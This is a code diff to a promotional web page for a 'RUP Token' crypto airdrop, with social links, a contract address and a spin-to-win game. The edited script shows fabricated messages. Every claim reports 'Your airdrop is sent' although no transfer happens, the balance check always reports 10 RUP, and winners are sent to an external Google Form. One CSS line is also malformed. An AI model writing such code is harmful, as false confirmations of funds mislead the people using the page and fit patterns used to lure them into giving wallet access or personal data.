@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>RUP TOKEN</title>
+  <title>RUP Token</title>
   <style>
     body {
       margin: 0;
@@ -17,7 +17,7 @@
     }
     .container {
       padding: 20px;
-      background: rgba(0,0,0,0.6);
+      background: FFAB00
       margin: 20px;
       border-radius: 10px;
     }
@@ -28,7 +28,7 @@
     h1 {
       color: #FFD700;
     }
-    .btn {
+    .btn, .social-btn {
       display: block;
       padding: 12px;
       margin: 10px auto;
@@ -40,20 +40,20 @@
       color: white;
       border-radius: 8px;
       border: none;
-      cursor: pointer;
     }
     .claim { background-color: #28a745; }
     .spin { background-color: #ffc107; color: black; }
     .check-balance { background-color: #17a2b8; }
-    .copy-btn { background-color: #444; }
-
     .telegram { background-color: #229ED9; }
     .whatsapp { background-color: #25D366; }
     .youtube { background-color: #FF0000; }
     .x { background-color: black; }
     .instagram { background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fd5949 45%, #d6249f 60%, #285AEB 90%); }
     .facebook { background-color: #3b5998; }
-
+    .copy-btn {
+      background-color: #444;
+      margin-top: 10px;
+    }
     section {
       margin: 20px 0;
     }
@@ -79,18 +79,18 @@
       <span id="token-address">0xAa93C8282927c384e5C40C8C0fE11a4B860B6074</span>
     </div>
 
-    <a href="https://t.me/rupeshelectronics2003" target="_blank" class="btn telegram">Join Telegram</a>
-    <a href="https://whatsapp.com/channel/0029Va8ksDrF6smvRNvEdt1y" target="_blank" class="btn whatsapp">Join WhatsApp</a>
-    <a href="https://www.youtube.com/@ruptoken" target="_blank" class="btn youtube">Join YouTube</a>
-    <a href="https://x.com/RupeshK30183542" target="_blank" class="btn x">Join X</a>
-    <a href="https://www.instagram.com/rupeshelectronics" target="_blank" class="btn instagram">Join Instagram</a>
-    <a href="https://facebook.com" target="_blank" class="btn facebook">Join Facebook</a>
+    <a href="https://t.me/rupeshelectronics2003" target="_blank" class="btn social-btn telegram">Join Telegram</a>
+    <a href="https://whatsapp.com/channel/0029Va8ksDrF6smvRNvEdt1y" target="_blank" class="btn social-btn whatsapp">Join WhatsApp</a>
+    <a href="https://www.youtube.com/@ruptoken" target="_blank" class="btn social-btn youtube">Join YouTube</a>
+    <a href="https://x.com/RupeshK30183542" target="_blank" class="btn social-btn x">Join X</a>
+    <a href="https://www.instagram.com/rupeshelectronics" target="_blank" class="btn social-btn instagram">Join Instagram</a>
+    <a href="https://facebook.com" target="_blank" class="btn social-btn facebook">Join Facebook</a>
   </div>
 
   <div class="container">
     <section>
-      <h2>Max Supply</h2>
-      <p>10,00,000 RUP</p>
+      <h2>Max Total Supply</h2>
+      <p>100,000,000 RUP</p>
     </section>
 
     <section>
@@ -100,7 +100,7 @@
 
     <section>
       <h2>Privacy Policy</h2>
-      <p>Hum kisi bhi user ka data store nahi karte. Aapka wallet address sirf airdrop claim ke liye use hota hai.</p>
+      <p>Hum kisi bhi user ka data store nahi karte. Aapka wallet address sirf aapke airdrop claim ke liye use hota hai.</p>
     </section>
 
     <section>
@@ -116,24 +116,23 @@
   </div>
 
   <script>
-    let claimed = false;
-    let wonAmount = 0;
+    async function connectWallet() {
+      if (typeof window.ethereum !== 'undefined') {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+      } else {
+        alert("MetaMask not found. Please install MetaMask extension.");
+        window.open('https://metamask.io/download/', '_blank');
+      }
+    }
 
     function claimToken() {
-      if (!claimed) {
-        claimed = true;
-        wonAmount += 10;
-        alert("You have successfully claimed 10 RUP Token!");
-      } else {
-        alert("You already claimed your airdrop!");
-      }
+      alert("You have claimed 10 RUP Token! Your airdrop is sent.");
     }
 
     function spinAndWin() {
       const result = Math.random();
       if (result > 0.5) {
-        wonAmount += 10;
-        alert("Congratulations! You won 10 RUP Token!");
+        alert("You won 10 RUP! Fill the form to claim.");
         window.open("https://docs.google.com/forms/d/1c7wCT1bU1dqFXz-JdyZDlF8eCUgvNqr4KA3M3kH-42U/viewform", "_blank");
       } else {
         alert("Try again! Better luck next time.");
@@ -141,7 +140,7 @@
     }
 
     function checkBalance() {
-      alert("Your current RUP Token balance is: " + wonAmount + " RUP");
+      alert("Your RUP token balance is: 10 RUP");
     }
 
     function copyAddress() {
